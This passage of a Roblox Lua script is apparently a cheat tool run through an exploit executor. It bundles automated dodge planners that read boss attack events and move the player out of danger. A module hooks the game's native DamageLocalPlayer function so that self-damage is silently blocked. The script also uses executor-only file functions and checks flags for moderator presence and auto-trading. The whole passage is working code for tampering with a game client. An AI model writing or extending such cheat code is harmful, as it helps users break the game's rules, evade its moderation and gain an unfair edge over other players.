                and (object.Size-template.Size).Magnitude<.15 and object:FindFirstChild(spec.Marker)~=nil
            if matches then
                local function admit()
                    if not closed and object.Parent and os.clock()<(castWindows[spec.Name]or 0)then register(object,"Projectile",spec.Name,spec.Radius)end
                end
                admit();if not warnings[object]then task.defer(admit)end
            end
        end
    end
    local function inspect(object)
        local name,parent=object.Name,object.Parent
        local group=parent and parent.Name
        if final and (group=="RedLightningDiscEffects" or group=="RedLightningLaserEffects" or group=="RedLightningEffects"
            or parent==ctx.Workspace and name=="Part")and final()then
            if group=="RedLightningDiscEffects" and name:match("^LightningDisc%d+$")and object:IsA("Model")then
                register(object,"Disc","Red Lightning Discs",ctx.DiscRadius or 3.6);return
            elseif group=="RedLightningLaserEffects" then
                if name=="RedBeam" and object:IsA("BasePart")then register(object,"Laser","Red Lightning Laser",ctx.LaserRadius or 5)end
                if name=="RedBeam" or name=="LockedAimWarning"then return end
            elseif group=="RedLightningEffects" and name=="LightningWaveAnchor" and object:IsA("BasePart")then
                register(object,"Wave","Red Lightning Wave");return
            elseif parent==ctx.Workspace and name=="Part" and object:IsA("BasePart")and object.Color==laserColor then
                task.defer(function()
                    if object.Parent and object:FindFirstChild("Beam")then register(object,"Box","Rubricatus Lasers")end
                end)
            end
        end
        if labels[object.Name]and (object:IsA("Model")or object:IsA("BasePart"))then register(object,labels[object.Name])end
        if object:IsA("BasePart")and object.Name=="Part"then projectile(object)end
    end
    if ctx.Replicate then bind(ctx.Replicate,function(_,phase,name,duration,target)
        if phase~="Initial"and phase~="RunPhase"then return end
        for _,spec in ipairs(ctx.Projectiles or {})do if spec.Name==name then castWindows[name]=os.clock()+10 end end
        if final and final()and phase=="Initial"and name=="RedLightningWave"and typeof(target)=="Vector3"then
            local origin=ctx.RubricatusOrigin and ctx.RubricatusOrigin()
            if not origin then return end
            origin+=Vector3.new(0,wave.OriginHeight or 2.5,0)
            local delta=target-origin
            delta=Vector3.new(delta.X,0,delta.Z)
            if delta.Magnitude<.01 then return end
            local direction=delta.Unit
            cone={Kind="Cone",Name="Red Lightning Wave",Origin=origin+direction*(wave.MuzzleOffset or 2.5),
                Direction=direction,Until=os.clock()+(wave.ChargeTime or .9)+math.clamp(tonumber(duration)or 1.7,.65,10)+.35}
        end
    end)end
    bind(ctx.Workspace.DescendantAdded,inspect)
    for _,object in ipairs(ctx.Workspace:QueryDescendants("#RedGroundWarning,#LockedAimWarning"))do inspect(object)end
    for _,tag in ipairs(tags)do
        local function tagged(object)if object:IsA("BasePart")and object.Name=="Circle"then register(object,"Circle")end end
        bind(ctx.Collection:GetInstanceAddedSignal(tag),tagged)
        for _,object in ipairs(ctx.Collection:GetTagged(tag))do tagged(object)end
    end
    if final then
        for _,tag in ipairs({"RubricatusAttack Attack","RubricatusSlam Slam"})do
            local function tagged(object)
                if final()and object.Name=="Box"and object:IsA("BasePart")then register(object,"Box",tag)end
            end
            bind(ctx.Collection:GetInstanceAddedSignal(tag),tagged)
            for _,object in ipairs(ctx.Collection:GetTagged(tag))do tagged(object)end
        end
        if final()then
            for _,name in ipairs({"RedLightningDiscEffects","RedLightningLaserEffects","RedLightningEffects"})do
                local folder=ctx.Workspace:FindFirstChild(name)
                if folder then for _,object in ipairs(folder:GetChildren())do inspect(object)end end
            end
        end
    end
    local mobs=ctx.Workspace:FindFirstChild("Mobs")
    local scanExisting=false
    for _,spec in ipairs(ctx.Projectiles or {})do
        local boss=mobs and spec.BossName and mobs:FindFirstChild(spec.BossName)
        local entity=boss and boss:FindFirstChild("Entity")
        local health=entity and entity:FindFirstChild("Health")
        if health and health.Value>0 then castWindows[spec.Name]=os.clock()+10;scanExisting=true end
    end
    if scanExisting then for _,object in ipairs(ctx.Workspace:GetChildren())do if object:IsA("BasePart")and object.Name=="Part"then projectile(object)end end end
    local function sample(object,entry,time)
        if not object.Parent then entry.RemovedAt=entry.RemovedAt or time;return end
        entry.RemovedAt=nil
        if entry.Kind=="Laser"and object.Shape~=Enum.PartType.Cylinder then return end
        local ok,frame,size=pcall(function()
            if entry.Kind=="Disc"then
                local root=object.PrimaryPart
                local target=object:GetAttribute("LockedTarget")
                if not root or typeof(target)~="Vector3"then return end
                entry.Target=target
                return root.CFrame,root.Size
            end
            if object:IsA("Model")then return object:GetBoundingBox()end
            return object.CFrame,object.Size
        end)
        if not ok or not frame or math.max(size.X,size.Z)<=.2 then return end
        if (entry.Kind=="Projectile"or entry.Kind=="Disc")and entry.CFrame and time>(entry.SampleAt or time)then
            local motion=(frame.Position-entry.CFrame.Position)/(time-entry.SampleAt)
            entry.Velocity=motion.Magnitude<=400 and motion or Vector3.zero
        end
        entry.CFrame=frame;entry.Size=size;entry.SampleAt=time
    end
    function api.RefreshThreats()
        if closed then return end
        table.clear(snapshots)
        local time=os.clock()
        for object,entry in pairs(warnings)do
            sample(object,entry,time)
            if time-entry.Started>20 or (entry.RemovedAt and time-entry.RemovedAt>.8)then warnings[object]=nil
            elseif entry.CFrame then snapshots[#snapshots+1]=entry end
        end
        if cone and time<cone.Until and final()then snapshots[#snapshots+1]=cone else cone=nil end
        api.ThreatCount=#snapshots;ctx.State.BossThreatCount=#snapshots;api.HasHazards=cone~=nil or next(warnings)~=nil
    end
    local function distanceFromSegment(point,start,segment)
        local length=segment:Dot(segment)
        local fraction=length>.01 and math.clamp((point-start):Dot(segment)/length,0,1)or 0
        return (point-start-segment*fraction).Magnitude
    end
    local function collision(entry,point,margin)
        local frame,size=entry.CFrame,entry.Size
        if entry.Kind=="Wave"or entry.Kind=="Cone"then
            if entry.Kind=="Wave"and cone then return false end
            local delta=point-(entry.Origin or frame.Position)
            if math.abs(delta.Y)>(wave.Height or 12)*.5+margin then return false end
            delta=Vector3.new(delta.X,0,delta.Z)
            if delta.Magnitude>(wave.Range or 52)+margin then return false end
            if not entry.Direction then return true end
            local forward=delta:Dot(entry.Direction)
            return forward>=-margin and (delta-entry.Direction*forward).Magnitude<=math.max(0,forward)*math.tan(math.rad((wave.SpreadAngle or 80)/2))+margin
        end
        if entry.Kind=="Box"or entry.Kind=="Laser"then
            local at=frame:PointToObjectSpace(point)
            if entry.Kind=="Laser"then
                local radius=math.max(entry.Radius,size.Y*.5)+margin
                return math.abs(at.X)<=size.X*.5+margin and at.Y*at.Y+at.Z*at.Z<=radius*radius
            end
            return math.abs(at.X)<=size.X*.5+margin and math.abs(at.Y)<=size.Y*.5+margin and math.abs(at.Z)<=size.Z*.5+margin
        end
        if entry.Kind=="Beam"then
            local at=frame:PointToObjectSpace(point)
            return math.abs(at.X)<size.X*.5+margin and math.abs(at.Z)<size.Z*.5+margin
        end
        if entry.Kind=="Projectile"or entry.Kind=="Disc"then
            local lead=math.clamp(.12+(ctx.State.PingMs or 0)/1000,.12,.4)
            local radius=(entry.Radius or math.max(size.X,size.Y,size.Z)*.5)+margin
            local position=frame.Position
            if entry.Kind=="Disc"and (point-entry.Target).Magnitude<radius then return true end
            return distanceFromSegment(point,position,(entry.Velocity or Vector3.zero)*lead)<radius
        end
        local x=math.abs(frame.RightVector.X)*size.X+math.abs(frame.UpVector.X)*size.Y+math.abs(frame.LookVector.X)*size.Z
        local z=math.abs(frame.RightVector.Z)*size.X+math.abs(frame.UpVector.Z)*size.Y+math.abs(frame.LookVector.Z)*size.Z
        local delta=(point-frame.Position)*Vector3.new(1,0,1)
        local radius=math.max(x,z)*.5+margin
        return delta:Dot(delta)<radius*radius
    end
    function api.IsThreatened(point)
        local margin=5+math.min(3,(ctx.State.PingMs or 0)/100)
        for _,entry in ipairs(snapshots)do if collision(entry,point,margin)then return true,entry.Name end end
        return false
    end
    function api.IsHazardPart(part)
        local object=part
        while object and object~=ctx.Workspace do if warnings[object]then return true end;object=object.Parent end
        return false
    end
    function api.Plan(point,desired,region,extraThreat)
        if closed or not ctx.State.AutoDodge then return nil end
        api.RefreshThreats()
        local time=os.clock()
        local danger,reason=api.IsThreatened(point)
        local targetDanger,targetReason=api.IsThreatened(desired or point)
        api.Blocked=danger or targetDanger
        if not api.Blocked and time>=escape.Until then escape.Point=nil;return nil end
        local function safe(candidate)
            if api.IsThreatened(candidate)or (extraThreat and extraThreat(candidate))then return false end
            if region then
                local at=region.CFrame:PointToObjectSpace(candidate)
                if math.abs(at.X)>region.Size.X*.5-8 or math.abs(at.Z)>region.Size.Z*.5-8 then return false end
            end
            return true
        end
        if escape.Point and safe(escape.Point)then return escape.Point,api.LastReason end
        if time<escape.SearchAt then return nil end
        local chosen=safe(point)and point or nil
        for radius=10,220,10 do
            if chosen then break end
            for direction=1,16 do
                local angle=direction*math.pi/8
                local candidate=point+Vector3.new(math.cos(angle)*radius,0,math.sin(angle)*radius)
                if safe(candidate)then chosen=candidate;break end
            end
        end
        escape.Point=chosen
        if not chosen then escape.SearchAt=time+.15;return nil end
        escape.Until=time+.45;api.LastReason=reason or targetReason or "Boss warning"
        ctx.State.LastBossWarning=api.LastReason
        return chosen,api.LastReason
    end
    function api.Destroy()
        if closed then return end
        closed=true;api.HasHazards=false;api.ThreatCount=0
        for _,connection in ipairs(bindings)do connection:Disconnect()end
        table.clear(bindings);table.clear(warnings);table.clear(snapshots);table.clear(castWindows);escape.Point=nil;cone=nil
    end
    return api
end

-- END BUNDLED BOSS DODGE
    end)()
    local native=services:FindFirstChild("EnemySkills")
    local definitions=native and native:FindFirstChild("Skills")
    local wave=definitions and definitions:FindFirstChild("Wave Defense")
    local bosses=wave and wave:FindFirstChild("Bosses")
    local configured={
        {Boss="Nythrane, the Hollow Flame",Skill="PurpleFireyOrb",Marker="Burning",Scale=2.5,Minimum=0},
        {Boss="Vaelith, the Riftborn",Skill="RiftDetonation",Marker="Zap",Scale=1,Minimum=8}}
    local projectiles={}
    for _,spec in ipairs(configured)do
        local boss=bosses and bosses:FindFirstChild(spec.Boss)
        local skill=boss and boss:FindFirstChild(spec.Skill)
        local part=skill and skill:FindFirstChild("Part")
        if part and part:IsA("BasePart")then
            local width=math.max(part.Size.X,part.Size.Y,part.Size.Z)*.5
            projectiles[#projectiles+1]={BossName=spec.Boss,Name=spec.Skill,Marker=spec.Marker,Template=part,Radius=math.max(spec.Minimum,width*spec.Scale)}
        end
    end
    local events=ReplicatedStorage:FindFirstChild("ReplicateSkill")
    local rubricatusName="Rubricatus, The Sentinel of Order"
    local rubricatus=bosses and bosses:FindFirstChild(rubricatusName)
    local function attributes(name)
        local skill=rubricatus and rubricatus:FindFirstChild(name)
        return skill and skill:GetAttributes()or {}
    end
    state.BossDodge=buildWarnings({State=state,Workspace=workspace,Collection=game:GetService("CollectionService"),
        Projectiles=projectiles,Replicate=events and events.OnClientEvent,
        FinalWave=game.PlaceId==78945654064532 and function()return workspace:GetAttribute("Wave")==100 end or nil,
        RubricatusWave=attributes("RedLightningWave"),DiscRadius=attributes("RedLightningDiscs").Radius,
        LaserRadius=attributes("RedLightningLaser").Radius,
        RubricatusOrigin=function()
            local mobs=workspace:FindFirstChild("Mobs")
            local boss=mobs and mobs:FindFirstChild(rubricatusName)
            return boss and boss:GetPivot().Position
        end})
end
do
    local createPlanner=(function()
-- BEGIN BUNDLED ATHEON DODGE
-- Bounded evasion uses native cast lifecycles, flame assets, and geyser markers.
return function(ctx)
    local api={Moves=0,Seen={},Completed={},ThreatCount=0,MaxStep=112,MaxBossDistance=128,SmashRadius=90}
    local state=ctx.State
    local clock=ctx.Now or os.clock
    local casts,markers={},{}
    local closed=false
    local route={Point=nil,Due=0}
    local flat=Vector3.new(1,0,1)
    local supported={FireDash=true,LavaSmash=true,LavaGyzer=true}
    local function margin()return math.clamp(.1+(state.PingMs or 0)/1000,.15,.35)end
    local function registry(boss)
        local rig=(ctx.Native.RiggedEnemies or {})[boss]
        return rig and rig.ActiveSkills
    end
    local function collectAssets(entry,ended)
        if entry.Name~="FireDash"then return end
        entry.Assets=entry.Assets or {}
        for _,part in pairs(entry.Skill.CreatedAssets or {})do
            if part.Parent and part:IsA("BasePart")then entry.Assets[part]=true;entry.AssetsKnown=true end
        end
        if not ended or entry.AssetQueryDone or not ctx.FireAssets then return end
        entry.AssetQueryDone=true
        local ok,parts=pcall(ctx.FireAssets,entry.Skill)
        if ok and type(parts)=="table"then
            entry.AssetsKnown=true
            for _,part in ipairs(parts)do entry.Assets[part]=true end
        end
    end
    local function airborne(entry,time)
        if entry.Name~="LavaSmash"then return false end
        if time-entry.Started>=14 then return true end
        local position=ctx.Position(entry.Boss)
        local ground=entry.Skill.LastCFrame and entry.Skill.LastCFrame.Position or entry.Skill.SurfacePosition
        if not position or not ground then return true end
        local grounded=ctx.Grounded and ctx.Grounded(entry.Boss)or (not ctx.Grounded and math.abs(position.Y-ground.Y)<=6)
        if not grounded and position.Y>ground.Y+6 then
            entry.WasAirborne=true;entry.CompletedAt=nil;entry.Until=math.max(entry.Until,time+1.2)
        elseif grounded and entry.WasAirborne and not entry.LandedAt then
            entry.LandedAt=time;entry.Until=math.max(entry.Until,time+1.2+(state.PingMs or 0)/1000)
        end
        return not grounded
    end
    local function settle(entry,time)
        local active=registry(entry.Boss)
        local ended=entry.Skill.Destroyed==true or (active and active[entry.Name]~=entry.Skill)
        collectAssets(entry,ended)
        if not ended or airborne(entry,time)then return end
        if not entry.CompletedAt then
            entry.CompletedAt=time;entry.ReturnMargin=margin()
            api.LastSkillEndAt=time;api.LastSkillEndName=entry.Name;api.LastReturnMargin=entry.ReturnMargin
            api.Completed[entry.Name]={At=time,Margin=entry.ReturnMargin}
        end
        local ready=entry.CompletedAt+entry.ReturnMargin
        if entry.Name~="FireDash"then entry.Until=math.min(entry.Until,ready);return end
        if not entry.AssetsKnown then return end
        local hasFlames=false
        for part in pairs(entry.Assets)do if part.Parent then hasFlames=true else entry.Assets[part]=nil end end
        entry.Until=hasFlames and math.min(entry.CompletedAt+3.2,math.max(ready,time+.2))or ready
    end
    local function discover(point,time)
        local nearest,gap
        for _,boss in ipairs(ctx.Bosses())do
            local position=ctx.Position(boss)
            local distance=position and (position-point).Magnitude
            if distance and (not gap or distance<gap)then nearest=position;gap=distance end
            for name,skill in pairs(registry(boss)or {})do
                if supported[name]and not skill.Destroyed then
                    local entry=casts[skill]
                    if not entry then
                        entry={Name=name,Skill=skill,Boss=boss,Started=time}
                        if name=="LavaSmash"then entry.MinimumUntil=time+math.clamp(tonumber(skill.Lifetime)or 3,1,8)+1.2+(state.PingMs or 0)/1000 end
                        casts[skill]=entry;api.Seen[name]=(api.Seen[name]or 0)+1
                    end
                    local tail=name=="FireDash"and 3.2 or name=="LavaGyzer"and 1 or .8
                    entry.Until=math.max(entry.MinimumUntil or 0,time+tail)
                end
            end
        end
        return nearest
    end
    local function sampleMarkers(time)
        for index,part in ipairs(ctx.Collection:GetTagged("LavaGyzer Point"))do
            if index>48 then break end
            if part.Parent and part:IsA("BasePart")then
                local entry=markers[part]
                if not entry then
                    entry={Started=time}
                    local duration=part.GetAttribute and part:GetAttribute("Lifetime")
                    if type(duration)=="number"and duration>=0 and duration<=15 then entry.Lifetime=duration end
                    markers[part]=entry
                end
                entry.Position=part.Position;entry.Radius=math.max(part.Size.X,part.Size.Z)*.5
                entry.Until=time+1;entry.SeenAt=time;entry.RemovedAt=nil
            end
        end
        local count=0
        for part,entry in pairs(markers)do
            if entry.SeenAt~=time and entry.Lifetime then
                entry.RemovedAt=entry.RemovedAt or time
                local padding=.15+margin()
                entry.Until=math.max(entry.Started+entry.Lifetime+padding,entry.RemovedAt+padding)
            end
            if time>entry.Until then markers[part]=nil else count+=1 end
        end
        return count
    end
    local function refresh(point,time)
        local nearest=discover(point,time)
        local count=sampleMarkers(time)
        local impact
        for skill,entry in pairs(casts)do
            -- Grounded state must be tracked even while the skill remains active.
            if entry.Name=="LavaSmash"then airborne(entry,time)end
            settle(entry,time)
            if time>entry.Until then casts[skill]=nil
            else count+=1;if entry.Name=="LavaSmash"then impact=entry.Skill.SurfacePosition or impact end end
        end
        api.Anchor=impact or nearest;api.ThreatCount=count
        api.NearBoss=api.Anchor~=nil and (api.Anchor-point).Magnitude<=api.MaxBossDistance
    end
    local function flameThreat(entry,point,padding)
        for part in pairs(entry.Assets)do
            if part.Parent then
                local localPoint=part.CFrame:PointToObjectSpace(Vector3.new(point.X,part.Position.Y,point.Z))
                if math.abs(localPoint.X)<part.Size.X*.5+padding and math.abs(localPoint.Z)<part.Size.Z*.5+padding then return true end
            end
        end
        return false
    end
    local function castThreat(entry,point,padding)
        local skill=entry.Skill
        if entry.Name=="LavaSmash"and skill.SurfacePosition then
            local delta=(point-skill.SurfacePosition)*flat
            return delta:Dot(delta)<(api.SmashRadius+padding)^2,"LavaSmash"
        end
        if entry.Name~="FireDash"or not skill.SurfacePosition or not skill.FocusPosition then return false end
        if entry.CompletedAt and entry.AssetsKnown and clock()>=entry.CompletedAt+entry.ReturnMargin then return flameThreat(entry,point,padding),"FireDash flames"end
        local segment=(skill.FocusPosition-skill.SurfacePosition)*flat
        local delta=(point-skill.SurfacePosition)*flat
        local length=segment:Dot(segment)
        local alpha=length>.01 and math.clamp(delta:Dot(segment)/length,0,1)or 0
        local offset=delta-segment*alpha
        local width=(tonumber(skill.Width)or 0)*.5+10+padding
        return offset:Dot(offset)<width*width,"FireDash"
    end
    local function threatened(point)
        local padding=8+math.min(4,(state.PingMs or 0)/100)
        for _,entry in pairs(casts)do local hit,reason=castThreat(entry,point,padding);if hit then return true,reason end end
        for _,entry in pairs(markers)do
            local delta=(point-entry.Position)*flat
            if delta:Dot(delta)<(entry.Radius+padding)^2 then return true,"LavaGyzer"end
        end
        if api.ThreatCount>0 and ctx.Warnings then return ctx.Warnings.IsThreatened(point)end
        return false
    end
    function api.Reset()
        table.clear(casts);table.clear(markers);route.Point=nil;route.Due=0
        api.ThreatCount=0;api.Active=false;api.NearBoss=false
    end
    function api.Plan(point,desired,floorY)
        if closed or not state.Running or not state.AtheonDodge or state.SafeModePanic or state.TravelBusy or state.Recovering then api.Reset();return nil end
        local time=clock();refresh(point,time)
        if api.ThreatCount==0 then api.Active=false;route.Point=nil;return nil end
        if ctx.Warnings then ctx.Warnings.RefreshThreats()end
        local danger,reason=threatened(point)
        local targetDanger,targetReason=threatened(desired or point)
        if not danger and not targetDanger then api.Active=false;route.Point=nil;return nil end
        local function valid(candidate)
            return candidate and api.Anchor and ctx.Valid(candidate)and (candidate-point).Magnitude<=api.MaxStep
                and (candidate-api.Anchor).Magnitude<=api.MaxBossDistance
        end
        local function safe(candidate)return valid(candidate)and not threatened(candidate)end
        if route.Point and safe(route.Point)then api.Active=true;return route.Point,api.LastReason end
        if time<route.Due then return nil end
        route.Due=time+.1
        local chosen
        if not danger and valid(point)then chosen=point
        elseif reason=="LavaSmash"and api.Anchor then
            local ground=floorY and floorY(point)
            local y=type(ground)=="number"and ground-20 or point.Y
            local radius=api.SmashRadius+14+math.min(4,(state.PingMs or 0)/100)
            if state.FarmAbove then
                local vertical=math.sqrt(math.max(0,api.MaxBossDistance^2-radius^2))-1
                y=math.clamp(point.Y,api.Anchor.Y-vertical,api.Anchor.Y+vertical)
            end
            local best
            for direction=1,16 do
                local angle=direction*math.pi/8
                local candidate=Vector3.new(api.Anchor.X+math.cos(angle)*radius,y,api.Anchor.Z+math.sin(angle)*radius)
                local distance=(candidate-point).Magnitude
                if safe(candidate)and (not best or distance<best)then chosen=candidate;best=distance end
            end
        else
            local smash=reason=="LavaSmash"or targetReason=="LavaSmash"
            local ground=smash and floorY and floorY(point)
            for radius=8,api.MaxStep,8 do
                if chosen then break end
                for direction=1,16 do
                    local angle=direction*math.pi/8
                    local candidate=point+Vector3.new(math.cos(angle)*radius,0,math.sin(angle)*radius)
                    if type(ground)=="number"then candidate=Vector3.new(candidate.X,ground-20,candidate.Z)end
                    if safe(candidate)then chosen=candidate;break end
                end
            end
        end
        if not chosen then
            local floor=floorY and floorY(point)
            local shallow=type(floor)=="number"and Vector3.new(point.X,floor-20,point.Z)
            if safe(shallow)then chosen=shallow end
        end
        route.Point=chosen;api.Active=chosen~=nil
        if chosen then api.LastReason=reason or targetReason or "Atheon warning";api.Moves+=1;return chosen,api.LastReason end
    end
    function api.Destroy()closed=true;api.Reset()end
    return api
end

-- END BUNDLED ATHEON DODGE
    end)()
    local module=services:FindFirstChild("EnemySkills")
    local native=state.NativeEnemySkills or module and require(module)or {RiggedEnemies={}}
    local function flames(skill)
        local origin,finish=skill.SurfacePosition,skill.FocusPosition
        if not origin or not finish then error("Dash path unavailable")end
        local segment=(finish-origin)*Vector3.new(1,0,1)
        local length=segment:Dot(segment)
        local expected=skill.IsCorrupted and "CorruptedFlames"or "Flames"
        local result={}
        for _,part in ipairs(workspace:QueryDescendants("#Flames,#CorruptedFlames"))do
            if part.Name==expected and part:IsA("BasePart")then
                local from=(part.Position-origin)*Vector3.new(1,0,1)
                local alpha=length>.01 and math.clamp(from:Dot(segment)/length,0,1)or 0
                if (from-segment*alpha).Magnitude<=(tonumber(skill.Width)or 50)+32 then result[#result+1]=part;if #result==8 then break end end
            end
        end
        return result
    end
    local function bosses()
        local folder=workspace:FindFirstChild("Mobs")
        local result={}
        if folder then
            for _,name in ipairs({"Atheon","Corrupted Atheon"})do
                local boss=folder:FindFirstChild(name)
                local entity=boss and boss:FindFirstChild("Entity");local health=entity and entity:FindFirstChild("Health")
                if health and health.Value>0 then result[#result+1]=boss end
            end
        end
        return result
    end
    state.AtheonDodgeController=createPlanner({State=state,Native=native,Collection=game:GetService("CollectionService"),Warnings=state.BossDodge,FireAssets=flames,Bosses=bosses,
        Grounded=function(boss)
            local data=getMobData(boss)
            if not data then return false end
            local _,air=state.GroundFollow.Resolve(boss,data,os.clock());return not air
        end,
        Position=function(boss)local root=boss:FindFirstChild("HumanoidRootPart")or boss.PrimaryPart;return root and root.Position end,
        Valid=function(point)return point.Y>workspace.FallenPartsDestroyHeight+35 and point.Magnitude<1000000 end})
end
do
    local factory=(function()
-- BEGIN BUNDLED AEGANATOS DODGE
-- Native phase envelopes: FireWave has a 3.5s swept plane; CreateGyzer is timed.
return function(ctx)
    local api={Active=false,Seen=0,Moves=0,Plans=0,Released=0}
    local hazards={}
    local connection
    local shelter
    local disposed=false
    local now=ctx.Now or os.clock
    local function receive(boss,operation,skill,phase,point,duration)
        if disposed or not ctx.State.AeganatosDodge or not ctx.IsBoss(boss)then return end
        if operation=="Initial"and skill=="OceanGyzer"and ctx.PlayerPosition then
            local predicted=ctx.PlayerPosition()
            if predicted then
                if #hazards>=32 then table.remove(hazards,1)end
                hazards[#hazards+1]={Kind=skill,Point=predicted,Radius=ctx.GyzerRadius+8,Expires=now()+18,ActivateAt=now()+4.8,Provisional=true,Boss=boss}
                api.Seen+=1
            end
            return
        end
        if operation~="RunPhase"or typeof(point)~="Vector3"then return end
        local record
        if skill=="OmegaWave"and phase=="FireWave"then
            local frame=ctx.Frame(boss)
            if not frame then return end
            local direction=frame.LookVector
            local travel=tonumber(duration)or 0
            record={Kind=skill,Frame=CFrame.lookAt(point,point+direction),
                Width=ctx.WaveSize.X/2+8,Height=ctx.WaveSize.Y/2+8,
                Length=ctx.WaveSize.Z+math.abs(travel)+12,Expires=now()+4.5}
        elseif skill=="OceanGyzer"and phase=="CreateGyzer"then
            for i=#hazards,1,-1 do if hazards[i].Provisional and hazards[i].Boss==boss then table.remove(hazards,i)end end
            record={Kind=skill,Point=point,Radius=ctx.GyzerRadius+8,Expires=now()+math.clamp(tonumber(duration)or 3,0,20)+1.2}
        end
        if record then
            if #hazards>=32 then table.remove(hazards,1)end
            hazards[#hazards+1]=record;api.Seen+=1
        end
    end
    if ctx.Replicate then connection=ctx.Replicate:Connect(receive)end
    local function contains(record,point)
        if record.ActivateAt and now()<record.ActivateAt then return false end
        if record.Kind=="OceanGyzer"then return ((point-record.Point)*Vector3.new(1,0,1)).Magnitude<record.Radius end
        local localPoint=record.Frame:PointToObjectSpace(point)
        return math.abs(localPoint.X)<record.Width and math.abs(localPoint.Y)<record.Height
            and localPoint.Z<8 and localPoint.Z>-record.Length
    end
    function api.Plan(point,desired)
        api.Active=false
        if disposed then return end
        for i=#hazards,1,-1 do if now()>=hazards[i].Expires then table.remove(hazards,i)end end
        local s=ctx.State
        if not s.AeganatosDodge or s.StopEverything or s.SafeModePanic or s.ModeratorBlocking or s.TravelBusy or s.AutoTradeBusy then return end
        local danger
        for _,record in ipairs(hazards)do if contains(record,point)or contains(record,desired)then danger=record;break end end
        if not danger then
            if shelter then api.Released+=1 end
            shelter=nil
            return
        end
        api.Plans+=1
        if shelter then
            local safe=ctx.Valid(shelter.Point)
            for _,record in ipairs(hazards)do if contains(record,shelter.Point)then safe=false;break end end
            if safe then api.Active=true;return shelter.Point,shelter.Kind end
            shelter=nil
        end
        local alreadySafe=ctx.Valid(point)
        for _,record in ipairs(hazards)do if contains(record,point)then alreadySafe=false;break end end
        if alreadySafe then shelter={Point=point,Kind=danger.Kind};api.Active=true;return point,danger.Kind end
        local candidates={}
        if danger.Kind=="OmegaWave"then
            local p=danger.Frame:PointToObjectSpace(point)
            candidates={danger.Frame:PointToWorldSpace(Vector3.new(danger.Width+5,p.Y,p.Z)),
                danger.Frame:PointToWorldSpace(Vector3.new(-danger.Width-5,p.Y,p.Z)),
                Vector3.new(point.X,danger.Frame.Position.Y-danger.Height-6,point.Z)}
        else
            local radius=danger.Radius+5
            for i=0,7 do local angle=i*math.pi/4;candidates[#candidates+1]=danger.Point+Vector3.new(math.cos(angle)*radius,point.Y-danger.Point.Y,math.sin(angle)*radius)end
        end
        local best,cost
        for _,candidate in ipairs(candidates)do
            local valid=ctx.Valid(candidate)
            for _,record in ipairs(hazards)do if contains(record,candidate)then valid=false;break end end
            local distance=(candidate-point).Magnitude
            if valid and distance<=180 and(not cost or distance<cost)then best=candidate;cost=distance end
        end
        if best then shelter={Point=best,Kind=danger.Kind};api.Active=true;api.Moves+=1;return best,danger.Kind end
    end
    function api.Reset()table.clear(hazards);shelter=nil;api.Active=false end
    function api.Destroy()if disposed then return end;disposed=true;if connection then connection:Disconnect()end;api.Reset()end
    return api
end

-- END BUNDLED AEGANATOS DODGE
    end)()
    local enemy=services:FindFirstChild("EnemySkills")
    local catalog=enemy and enemy:FindFirstChild("Skills")
    local floors=catalog and catalog:FindFirstChild("Floors")
    local ocean=floors and floors:FindFirstChild("Ocean Floor")
    local boss=ocean and ocean:FindFirstChild("Aeganatos, The Sunken Sovereign")
    local wave=boss and boss:FindFirstChild("OmegaWave")
    local template=wave and wave:FindFirstChild("Wave")
    local plane=template and template:FindFirstChild("Plane")
    local replicate=ReplicatedStorage:FindFirstChild("ReplicateSkill")
    state.AeganatosDodgeController=factory({State=state,Replicate=replicate and replicate.OnClientEvent,
        WaveSize=plane and plane.Size or Vector3.new(96,38,101),GyzerRadius=145,
        PlayerPosition=function()local character=player.Character;local root=character and character:FindFirstChild("HumanoidRootPart");return root and root.Position end,
        IsBoss=function(mob)return typeof(mob)=="Instance"and mob.Name=="Aeganatos, The Sunken Sovereign"end,
        Frame=function(mob)local root=mob:FindFirstChild("HumanoidRootPart");return root and root.CFrame end,
        Valid=function(point)return point.Y>workspace.FallenPartsDestroyHeight+35 and point.Magnitude<1000000 end})
    function state.SetAeganatosDodge(value)
        state.AeganatosDodge=value==true
        if not value then state.AeganatosDodgeController.Reset()end
        requestSave()
    end
end
do
    local create=(function()
-- BEGIN BUNDLED SELF DAMAGE PROTECTION
-- Interpose one native report method; never replace global remote dispatch.
return function(context)
    local protection={Blocked=0}
    local state=context.State
    local native=context.Native
    local active,closed=false,false
    local token
    local function release()
        local hook=token;token=nil
        if hook and native.DamageLocalPlayer==hook.Wrapper then native.DamageLocalPlayer=hook.Original end
    end
    function protection.Set(requested)
        if closed then return false end
        requested=requested==true
        if not requested then release()
        elseif not token or native.DamageLocalPlayer~=token.Wrapper then
            local original=native.DamageLocalPlayer
            if type(original)~="function"then state.LastSelfDamageProtectionError="Native DamageSelf entry point unavailable";return false end
            local wrapper=function(...)
                if active and not closed and state and state.Running and not state.StopEverything then protection.Blocked+=1;return end
                return original(...)
            end
            token={Original=original,Wrapper=wrapper};native.DamageLocalPlayer=wrapper
        end
        active=requested;state.NoSelfDamage=requested
        return true
    end
    function protection.Destroy()
        if closed then return end
        closed=true;active=false;release();state=nil;context.State=nil
    end
    return protection
end

-- END BUNDLED SELF DAMAGE PROTECTION
    end)()
    local enemy=services:FindFirstChild("EnemySkills")
    local base=enemy and enemy:FindFirstChild("Base")
    state.SelfDamageProtection=create({State=state,Native=base and require(base)or {}})
    function state.SetNoSelfDamage(value)
        local ok=state.SelfDamageProtection.Set(value)
        if ok then requestSave()end
        return ok
    end
    state.SetNoSelfDamage(state.NoSelfDamage)
end
local waveDodge=(function()
-- BEGIN BUNDLED WAVE DODGE
-- Challenge-floor controller: event observation, geometry, and movement are separate phases.
return function(ctx)
    local state=ctx.State
    local player=game.Players.LocalPlayer
    local api={Active=false,Seen={},History={},Moves=0}
    local eventNames={"Lava","Tempest","Blackout","Horde","Rift","Wisp","Meme","Bob"}
    local closed=false
    local timing={UpdateAt=0,LastMove=0}
    local darknessShelter=Vector3.new(12,37,3)
    local terrain={Environment=nil,Floor=nil,Refuge=nil,RefugeUntil=0}
    local event,lastEvent,lastHealth
    local path="SB2Codex/wave-tests_"..player.UserId..".json"
    local audit=getgenv().SB2WaveDodgeAudit
    if not audit then
        audit={Seen={}}
        pcall(function()
            if not isfile(path)then return end
            local text=readfile(path)
            if #text>=65536 then return end
            local value=game:GetService("HttpService"):JSONDecode(text)
            if value.Version==1 and type(value.Seen)=="table"then audit.Seen=value.Seen end
        end)
        getgenv().SB2WaveDodgeAudit=audit
    end
    api.Seen=audit.Seen
    local function persist()
        pcall(function()
            if not isfolder("SB2Codex")then makefolder("SB2Codex")end
